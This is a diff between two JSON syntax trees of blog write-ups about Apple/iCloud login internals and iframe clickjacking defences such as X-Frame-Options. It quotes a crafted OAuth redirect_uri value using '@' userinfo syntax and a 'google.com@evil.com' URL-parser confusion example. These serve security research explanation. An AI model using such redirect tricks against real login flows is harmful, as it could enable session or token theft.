<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
5324a2275,2293
>                   "type": "text",
>                   "value": "I never truly verified if this is the case -- that is, whether I can derive an\niCloud session from an ",
>                   "position": {
>                     "start": {
>                       "line": 175,
>                       "column": 1,
>                       "offset": 8873
>                     },
>                     "end": {
>                       "line": 176,
>                       "column": 24,
>                       "offset": 8976
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
5326c2295
<                   "value": "response_mode=web_message",
---
>                   "value": "apple.com",
5329,5331c2298,2300
<                       "line": 325,
<                       "column": 4,
<                       "offset": 15714
---
>                       "line": 176,
>                       "column": 24,
>                       "offset": 8976
5334,5336c2303,2305
<                       "line": 325,
<                       "column": 31,
<                       "offset": 15741
---
>                       "line": 176,
>                       "column": 35,
>                       "offset": 8987
5343c2312
<                   "value": " appears to be the special indicator to the Apple ID\nserver that we don't want normal OAuth, we want an embedded page that passes us\nthe token eventually. 'web message' in this case likely refers to the\n",
---
>                   "value": " session. But I did get a hankering to\ninvestigate, and my investigation proved a lot of my intuition correct at least.",
5346,5348c2315,2317
<                       "line": 325,
<                       "column": 31,
<                       "offset": 15741
---
>                       "line": 176,
>                       "column": 35,
>                       "offset": 8987
5351c2320,2371
<                       "line": 328,
---
>                       "line": 177,
>                       "column": 81,
>                       "offset": 9107
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 175,
>                   "column": 1,
>                   "offset": 8873
>                 },
>                 "end": {
>                   "line": 177,
>                   "column": 81,
>                   "offset": 9107
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "thematicBreak",
>               "position": {
>                 "start": {
>                   "line": 179,
>                   "column": 1,
>                   "offset": 9111
>                 },
>                 "end": {
>                   "line": 179,
>                   "column": 81,
>                   "offset": 9191
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "A telltale oddity on ",
>                   "position": {
>                     "start": {
>                       "line": 181,
5353c2373,2482
<                       "offset": 15947
---
>                       "offset": 9195
>                     },
>                     "end": {
>                       "line": 181,
>                       "column": 22,
>                       "offset": 9216
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 181,
>                       "column": 22,
>                       "offset": 9216
>                     },
>                     "end": {
>                       "line": 181,
>                       "column": 34,
>                       "offset": 9228
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ": if I am logged into ",
>                   "position": {
>                     "start": {
>                       "line": 181,
>                       "column": 34,
>                       "offset": 9228
>                     },
>                     "end": {
>                       "line": 181,
>                       "column": 56,
>                       "offset": 9250
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "apple.com",
>                   "position": {
>                     "start": {
>                       "line": 181,
>                       "column": 56,
>                       "offset": 9250
>                     },
>                     "end": {
>                       "line": 181,
>                       "column": 67,
>                       "offset": 9261
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", and I try to\nlog into ",
>                   "position": {
>                     "start": {
>                       "line": 181,
>                       "column": 67,
>                       "offset": 9261
>                     },
>                     "end": {
>                       "line": 182,
>                       "column": 10,
>                       "offset": 9286
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 182,
>                       "column": 10,
>                       "offset": 9286
>                     },
>                     "end": {
>                       "line": 182,
>                       "column": 22,
>                       "offset": 9298
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", the login dialog presents my email on the email line\nwithout my ever entering it. How is this possible? Well, it turns out that the\napple login system is located at ",
>                   "position": {
>                     "start": {
>                       "line": 182,
>                       "column": 22,
>                       "offset": 9298
>                     },
>                     "end": {
>                       "line": 184,
>                       "column": 34,
>                       "offset": 9467
5356d2484
<                       1,
5364c2492
<                   "value": "postMessage",
---
>                   "value": "idmsa.apple.com",
5367,5369c2495,2497
<                       "line": 328,
<                       "column": 1,
<                       "offset": 15947
---
>                       "line": 184,
>                       "column": 34,
>                       "offset": 9467
5372,5374c2500,2502
<                       "line": 328,
<                       "column": 14,
<                       "offset": 15960
---
>                       "line": 184,
>                       "column": 51,
>                       "offset": 9484
5381c2509
<                   "value": " API which is used to securely communicate between embeds and other\nwebpages.",
---
>                   "value": " and is ",
5384,5386c2512,2514
<                       "line": 328,
<                       "column": 14,
<                       "offset": 15960
---
>                       "line": 184,
>                       "column": 51,
>                       "offset": 9484
5389,5391c2517,2641
<                       "line": 329,
<                       "column": 10,
<                       "offset": 16038
---
>                       "line": 184,
>                       "column": 59,
>                       "offset": 9492
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "embedded",
>                       "position": {
>                         "start": {
>                           "line": 184,
>                           "column": 60,
>                           "offset": 9493
>                         },
>                         "end": {
>                           "line": 184,
>                           "column": 68,
>                           "offset": 9501
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 184,
>                       "column": 59,
>                       "offset": 9492
>                     },
>                     "end": {
>                       "line": 184,
>                       "column": 69,
>                       "offset": 9502
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " into\nicloud. Since ",
>                   "position": {
>                     "start": {
>                       "line": 184,
>                       "column": 69,
>                       "offset": 9502
>                     },
>                     "end": {
>                       "line": 185,
>                       "column": 15,
>                       "offset": 9523
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 185,
>                       "column": 15,
>                       "offset": 9523
>                     },
>                     "end": {
>                       "line": 185,
>                       "column": 32,
>                       "offset": 9540
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " inherits the ",
>                   "position": {
>                     "start": {
>                       "line": 185,
>                       "column": 32,
>                       "offset": 9540
>                     },
>                     "end": {
>                       "line": 185,
>                       "column": 46,
>                       "offset": 9554
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "*.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 185,
>                       "column": 46,
>                       "offset": 9554
>                     },
>                     "end": {
>                       "line": 185,
>                       "column": 59,
>                       "offset": 9567
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " session cookie, it\nalready knows my email. By the looks of it though, it needs my confirmation to\ngrant a special iCloud session so I can log into my iCloud. Which is a pretty\nsensible decision, as previously mentioned.",
>                   "position": {
>                     "start": {
>                       "line": 185,
>                       "column": 59,
>                       "offset": 9567
>                     },
>                     "end": {
>                       "line": 188,
>                       "column": 44,
>                       "offset": 9790
5393a2644,2645
>                       1,
>                       1,
5401,5403c2653,2655
<                   "line": 325,
<                   "column": 4,
<                   "offset": 15714
---
>                   "line": 181,
>                   "column": 1,
>                   "offset": 9195
5406,5408c2658,2660
<                   "line": 329,
<                   "column": 10,
<                   "offset": 16038
---
>                   "line": 188,
>                   "column": 44,
>                   "offset": 9790
5413a2666,2668
>                   1,
>                   1,
>                   1,
5417,5428d2671
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 325,
<               "column": 1,
<               "offset": 15711
<             },
<             "end": {
<               "line": 330,
<               "column": 1,
<               "offset": 16040
5430,5443d2672
<             "indent": [
<               1,
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
5448,5449c2677,2678
<                   "type": "inlineCode",
<                   "value": "locale",
---
>                   "type": "text",
>                   "value": "We've all embedded something before. Come to think of it, I ",
5452,5454c2681,2683
<                       "line": 331,
<                       "column": 4,
<                       "offset": 16045
---
>                       "line": 190,
>                       "column": 1,
>                       "offset": 9794
5457,5459c2686,2723
<                       "line": 331,
<                       "column": 12,
<                       "offset": 16053
---
>                       "line": 190,
>                       "column": 61,
>                       "offset": 9854
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "hope",
>                       "position": {
>                         "start": {
>                           "line": 190,
>                           "column": 62,
>                           "offset": 9855
>                         },
>                         "end": {
>                           "line": 190,
>                           "column": 66,
>                           "offset": 9859
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 190,
>                       "column": 61,
>                       "offset": 9854
>                     },
>                     "end": {
>                       "line": 190,
>                       "column": 67,
>                       "offset": 9860
5466c2730
<                   "value": " just indicates the language to show the login dialog in. ",
---
>                   "value": " we've all\nembedded something before. Not so many people pasting embed code into their\npersonal websites these days I guess. That's probably a good thing (not you,\nGoogle Tag Manager!!).",
5469,5471c2733,2735
<                       "line": 331,
<                       "column": 12,
<                       "offset": 16053
---
>                       "line": 190,
>                       "column": 67,
>                       "offset": 9860
5474,5476c2738,2783
<                       "line": 331,
<                       "column": 70,
<                       "offset": 16111
---
>                       "line": 193,
>                       "column": 23,
>                       "offset": 10049
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 190,
>                   "column": 1,
>                   "offset": 9794
>                 },
>                 "end": {
>                   "line": 193,
>                   "column": 23,
>                   "offset": 10049
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If I want to share the legendary ",
>                   "position": {
>                     "start": {
>                       "line": 195,
>                       "column": 1,
>                       "offset": 10053
>                     },
>                     "end": {
>                       "line": 195,
>                       "column": 34,
>                       "offset": 10086
5482,5483c2789,2813
<                   "type": "inlineCode",
<                   "value": "frame_id",
---
>                   "type": "linkReference",
>                   "identifier": "3",
>                   "label": "3",
>                   "referenceType": "full",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "SM64 - Watch for Rolling Rocks - 0.5x A\nPresses (Commentated)",
>                       "position": {
>                         "start": {
>                           "line": 195,
>                           "column": 35,
>                           "offset": 10087
>                         },
>                         "end": {
>                           "line": 196,
>                           "column": 22,
>                           "offset": 10149
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
5486,5488c2816,2818
<                       "line": 331,
<                       "column": 70,
<                       "offset": 16111
---
>                       "line": 195,
>                       "column": 34,
>                       "offset": 10086
5491,5493c2821,2879
<                       "line": 331,
<                       "column": 80,
<                       "offset": 16121
---
>                       "line": 196,
>                       "column": 26,
>                       "offset": 10153
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " video from YouTube I might want to put in a video\nplayer. and (thank the gods) the 'share' button ",
>                   "position": {
>                     "start": {
>                       "line": 196,
>                       "column": 26,
>                       "offset": 10153
>                     },
>                     "end": {
>                       "line": 197,
>                       "column": 49,
>                       "offset": 10253
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "still",
>                       "position": {
>                         "start": {
>                           "line": 197,
>                           "column": 50,
>                           "offset": 10254
>                         },
>                         "end": {
>                           "line": 197,
>                           "column": 55,
>                           "offset": 10259
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 197,
>                       "column": 49,
>                       "offset": 10253
>                     },
>                     "end": {
>                       "line": 197,
>                       "column": 56,
>                       "offset": 10260
5500c2886
<                   "value": " I\nthink is just to help differentiate cases where there may be multiple different\nembedded pages.",
---
>                   "value": " has an 'embed' option\nwith some HTML code after 10 years or however long YouTube has been around for.",
5503,5505c2889,2891
<                       "line": 331,
<                       "column": 80,
<                       "offset": 16121
---
>                       "line": 197,
>                       "column": 56,
>                       "offset": 10260
5508,5510c2894,2896
<                       "line": 333,
<                       "column": 16,
<                       "offset": 16221
---
>                       "line": 198,
>                       "column": 80,
>                       "offset": 10363
5513d2898
<                       1,
5521,5523c2906,2908
<                   "line": 331,
<                   "column": 4,
<                   "offset": 16045
---
>                   "line": 195,
>                   "column": 1,
>                   "offset": 10053
5526,5528c2911,2913
<                   "line": 333,
<                   "column": 16,
<                   "offset": 16221
---
>                   "line": 198,
>                   "column": 80,
>                   "offset": 10363
5531a2917
>                   1,
5535,5601d2920
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 331,
<               "column": 1,
<               "offset": 16042
<             },
<             "end": {
<               "line": 333,
<               "column": 16,
<               "offset": 16221
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 317,
<           "column": 1,
<           "offset": 15234
<         },
<         "end": {
<           "line": 333,
<           "column": 16,
<           "offset": 16221
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Considering that this was a big factor in ",
<           "position": {
<             "start": {
<               "line": 335,
<               "column": 1,
<               "offset": 16225
<             },
<             "end": {
<               "line": 335,
<               "column": 43,
<               "offset": 16267
5603,5611d2921
<             "indent": []
<           }
<         },
<         {
<           "type": "linkReference",
<           "identifier": "how to hack the uk tax system",
<           "label": "How to Hack the UK Tax System",
<           "referenceType": "shortcut",
<           "children": [
5613,5614c2923,2927
<               "type": "text",
<               "value": "How to Hack the UK Tax System",
---
>               "type": "definition",
>               "identifier": "3",
>               "label": "3",
>               "title": null,
>               "url": "https://www.youtube.com/watch?v=kpk2tdsPh0A",
5617,5619c2930,2932
<                   "line": 335,
<                   "column": 44,
<                   "offset": 16268
---
>                   "line": 200,
>                   "column": 1,
>                   "offset": 10367
5622,5624c2935,2937
<                   "line": 335,
<                   "column": 73,
<                   "offset": 16297
---
>                   "line": 200,
>                   "column": 49,
>                   "offset": 10415
5628,5728d2940
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 335,
<               "column": 43,
<               "offset": 16267
<             },
<             "end": {
<               "line": 335,
<               "column": 74,
<               "offset": 16298
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", this\nmight make me awfully predictable but the first thing I tried was sneaking an ",
<           "position": {
<             "start": {
<               "line": 335,
<               "column": 74,
<               "offset": 16298
<             },
<             "end": {
<               "line": 336,
<               "column": 79,
<               "offset": 16384
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "@",
<           "position": {
<             "start": {
<               "line": 336,
<               "column": 79,
<               "offset": 16384
<             },
<             "end": {
<               "line": 336,
<               "column": 82,
<               "offset": 16387
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\ninto ",
<           "position": {
<             "start": {
<               "line": 336,
<               "column": 82,
<               "offset": 16387
<             },
<             "end": {
<               "line": 337,
<               "column": 6,
<               "offset": 16394
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 337,
<               "column": 6,
<               "offset": 16394
<             },
<             "end": {
<               "line": 337,
<               "column": 20,
<               "offset": 16408
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ":",
<           "position": {
<             "start": {
<               "line": 337,
<               "column": 20,
<               "offset": 16408
<             },
<             "end": {
<               "line": 337,
<               "column": 21,
<               "offset": 16409
5730,5817d2941
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 335,
<           "column": 1,
<           "offset": 16225
<         },
<         "end": {
<           "line": 337,
<           "column": 21,
<           "offset": 16409
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "how to hack the uk tax system",
<       "label": "How to hack the UK Tax System",
<       "title": null,
<       "url": "https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b",
<       "position": {
<         "start": {
<           "line": 339,
<           "column": 1,
<           "offset": 16413
<         },
<         "end": {
<           "line": 339,
<           "column": 110,
<           "offset": 16522
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": null,
<       "meta": null,
<       "value": "redirect_uri=https%3A%2F%2Fthomas@www.icloud.com",
<       "position": {
<         "start": {
<           "line": 341,
<           "column": 1,
<           "offset": 16526
<         },
<         "end": {
<           "line": 343,
<           "column": 4,
<           "offset": 16584
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This is an old and extremely not supposed to be used syntax called 'HTTP Simple\nAuthentication URL Syntax'. The idea is that you could specify ",
<           "position": {
<             "start": {
<               "line": 345,
<               "column": 1,
<               "offset": 16588
<             },
<             "end": {
<               "line": 346,
<               "column": 64,
<               "offset": 16732
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
5819,5820c2943,2946
<               "type": "text",
<               "value": "in",
---
>               "type": "code",
>               "lang": "HTML",
>               "meta": null,
>               "value": "\n<iframe width=\"560\" height=\"315\"\nsrc=\"https://www.youtube.com/embed/kpk2tdsPh0A\" frameborder=\"0\"\nallow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\"\nallowfullscreen></iframe>\n",
5823,5825c2949,2951
<                   "line": 346,
<                   "column": 65,
<                   "offset": 16733
---
>                   "line": 202,
>                   "column": 1,
>                   "offset": 10419
5828,5830c2954,2956
<                   "line": 346,
<                   "column": 67,
<                   "offset": 16735
---
>                   "line": 209,
>                   "column": 4,
>                   "offset": 10642
5832c2958,2966
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
5834,6010d2967
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 346,
<               "column": 64,
<               "offset": 16732
<             },
<             "end": {
<               "line": 346,
<               "column": 68,
<               "offset": 16736
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " the url how\nyou wanted to login. For example, if I wanted to log into ",
<           "position": {
<             "start": {
<               "line": 346,
<               "column": 68,
<               "offset": 16736
<             },
<             "end": {
<               "line": 347,
<               "column": 59,
<               "offset": 16808
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "google.com",
<           "position": {
<             "start": {
<               "line": 347,
<               "column": 59,
<               "offset": 16808
<             },
<             "end": {
<               "line": 347,
<               "column": 71,
<               "offset": 16820
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " as my\naccount 'thomas', I'd open up in my browser ",
<           "position": {
<             "start": {
<               "line": 347,
<               "column": 71,
<               "offset": 16820
<             },
<             "end": {
<               "line": 348,
<               "column": 45,
<               "offset": 16872
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://thomas@google.com",
<           "position": {
<             "start": {
<               "line": 348,
<               "column": 45,
<               "offset": 16872
<             },
<             "end": {
<               "line": 348,
<               "column": 72,
<               "offset": 16899
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and the\nwebpage might ask for the password for my account ",
<           "position": {
<             "start": {
<               "line": 348,
<               "column": 72,
<               "offset": 16899
<             },
<             "end": {
<               "line": 349,
<               "column": 51,
<               "offset": 16959
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "thomas",
<           "position": {
<             "start": {
<               "line": 349,
<               "column": 51,
<               "offset": 16959
<             },
<             "end": {
<               "line": 349,
<               "column": 59,
<               "offset": 16967
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 349,
<               "column": 59,
<               "offset": 16967
<             },
<             "end": {
<               "line": 349,
<               "column": 60,
<               "offset": 16968
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 345,
<           "column": 1,
<           "offset": 16588
<         },
<         "end": {
<           "line": 349,
<           "column": 60,
<           "offset": 16968
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The 'great' thing about this syntax when it comes to hacking websites is that\nHTTP Simple Authentication URL syntax is ",
<           "position": {
<             "start": {
<               "line": 351,
<               "column": 1,
<               "offset": 16972
<             },
<             "end": {
<               "line": 352,
<               "column": 42,
<               "offset": 17092
6012,6019d2968
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
6021,6022c2970,3045
<               "type": "text",
<               "value": "not",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The iframe is a classic great web idea that has survived the ages. I indicate to\nyour web browser in my web page with some HTML that I want ",
>                   "position": {
>                     "start": {
>                       "line": 211,
>                       "column": 1,
>                       "offset": 10646
>                     },
>                     "end": {
>                       "line": 212,
>                       "column": 60,
>                       "offset": 10787
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "another",
>                       "position": {
>                         "start": {
>                           "line": 212,
>                           "column": 61,
>                           "offset": 10788
>                         },
>                         "end": {
>                           "line": 212,
>                           "column": 68,
>                           "offset": 10795
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 212,
>                       "column": 60,
>                       "offset": 10787
>                     },
>                     "end": {
>                       "line": 212,
>                       "column": 69,
>                       "offset": 10796
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " webpage to\nbe included in my webpage. In this case, a YouTube video.",
>                   "position": {
>                     "start": {
>                       "line": 212,
>                       "column": 69,
>                       "offset": 10796
>                     },
>                     "end": {
>                       "line": 213,
>                       "column": 58,
>                       "offset": 10866
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
6025,6027c3048,3050
<                   "line": 352,
<                   "column": 43,
<                   "offset": 17093
---
>                   "line": 211,
>                   "column": 1,
>                   "offset": 10646
6030,6032c3053,3055
<                   "line": 352,
<                   "column": 46,
<                   "offset": 17096
---
>                   "line": 213,
>                   "column": 58,
>                   "offset": 10866
6034c3057,3060
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1
>                 ]
6036,6154d3061
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 352,
<               "column": 42,
<               "offset": 17092
<             },
<             "end": {
<               "line": 352,
<               "column": 47,
<               "offset": 17097
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " part of the URL specification,\nmeaning that even the most advanced URL parser is not meant to understand it,\nand will give you wrong answers.",
<           "position": {
<             "start": {
<               "line": 352,
<               "column": 47,
<               "offset": 17097
<             },
<             "end": {
<               "line": 354,
<               "column": 33,
<               "offset": 17241
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 351,
<           "column": 1,
<           "offset": 16972
<         },
<         "end": {
<           "line": 354,
<           "column": 33,
<           "offset": 17241
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "For example, if I give ",
<           "position": {
<             "start": {
<               "line": 356,
<               "column": 1,
<               "offset": 17245
<             },
<             "end": {
<               "line": 356,
<               "column": 24,
<               "offset": 17268
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://google.com@evil.com",
<           "position": {
<             "start": {
<               "line": 356,
<               "column": 24,
<               "offset": 17268
<             },
<             "end": {
<               "line": 356,
<               "column": 53,
<               "offset": 17297
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " to a normal URL parser, it\ndoesn't know what the ",
<           "position": {
<             "start": {
<               "line": 356,
<               "column": 53,
<               "offset": 17297
<             },
<             "end": {
<               "line": 357,
<               "column": 23,
<               "offset": 17348
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "@",
<           "position": {
<             "start": {
<               "line": 357,
<               "column": 23,
<               "offset": 17348
6156,6159c3063,3158
<             "end": {
<               "line": 357,
<               "column": 26,
<               "offset": 17351
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "But I put this to you: if I could just embed ",
>                   "position": {
>                     "start": {
>                       "line": 215,
>                       "column": 1,
>                       "offset": 10870
>                     },
>                     "end": {
>                       "line": 215,
>                       "column": 46,
>                       "offset": 10915
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "anything",
>                       "position": {
>                         "start": {
>                           "line": 215,
>                           "column": 47,
>                           "offset": 10916
>                         },
>                         "end": {
>                           "line": 215,
>                           "column": 55,
>                           "offset": 10924
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 215,
>                       "column": 46,
>                       "offset": 10915
>                     },
>                     "end": {
>                       "line": 215,
>                       "column": 56,
>                       "offset": 10925
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " on my website, we'd be\nhaving a bad time. If I could just tell your web browser to embed your bank on\nmy page, I could just stick a bunch of stuff over the top and, I don't know make\nyou click a button you can't see that actually donates a bunch of money to my\nman, YouTuber pannenkoek2012.",
>                   "position": {
>                     "start": {
>                       "line": 215,
>                       "column": 56,
>                       "offset": 10925
>                     },
>                     "end": {
>                       "line": 219,
>                       "column": 30,
>                       "offset": 11220
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 215,
>                   "column": 1,
>                   "offset": 10870
>                 },
>                 "end": {
>                   "line": 219,
>                   "column": 30,
>                   "offset": 11220
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6161,6171c3160,3394
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " means and might assume the URL goes a resource called\n",
<           "position": {
<             "start": {
<               "line": 357,
<               "column": 26,
<               "offset": 17351
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The first way browsers started to deal with this 'Clickjacking' problem is the\n",
>                   "position": {
>                     "start": {
>                       "line": 221,
>                       "column": 1,
>                       "offset": 11224
>                     },
>                     "end": {
>                       "line": 222,
>                       "column": 1,
>                       "offset": 11304
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options",
>                   "position": {
>                     "start": {
>                       "line": 222,
>                       "column": 1,
>                       "offset": 11304
>                     },
>                     "end": {
>                       "line": 222,
>                       "column": 18,
>                       "offset": 11321
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " header. It has two possible values: ",
>                   "position": {
>                     "start": {
>                       "line": 222,
>                       "column": 18,
>                       "offset": 11321
>                     },
>                     "end": {
>                       "line": 222,
>                       "column": 55,
>                       "offset": 11358
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "DENY",
>                   "position": {
>                     "start": {
>                       "line": 222,
>                       "column": 55,
>                       "offset": 11358
>                     },
>                     "end": {
>                       "line": 222,
>                       "column": 61,
>                       "offset": 11364
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which prevents the\npage from ever being embedded, or ",
>                   "position": {
>                     "start": {
>                       "line": 222,
>                       "column": 61,
>                       "offset": 11364
>                     },
>                     "end": {
>                       "line": 223,
>                       "column": 35,
>                       "offset": 11420
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "sameorigin",
>                   "position": {
>                     "start": {
>                       "line": 223,
>                       "column": 35,
>                       "offset": 11420
>                     },
>                     "end": {
>                       "line": 223,
>                       "column": 47,
>                       "offset": 11432
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which only allows it to embed\nitself. If you are developing a website you should ",
>                   "position": {
>                     "start": {
>                       "line": 223,
>                       "column": 47,
>                       "offset": 11432
>                     },
>                     "end": {
>                       "line": 224,
>                       "column": 52,
>                       "offset": 11516
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "always",
>                       "position": {
>                         "start": {
>                           "line": 224,
>                           "column": 53,
>                           "offset": 11517
>                         },
>                         "end": {
>                           "line": 224,
>                           "column": 59,
>                           "offset": 11523
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 224,
>                       "column": 52,
>                       "offset": 11516
>                     },
>                     "end": {
>                       "line": 224,
>                       "column": 60,
>                       "offset": 11524
>                     },
>                     "indent": []
>                   }
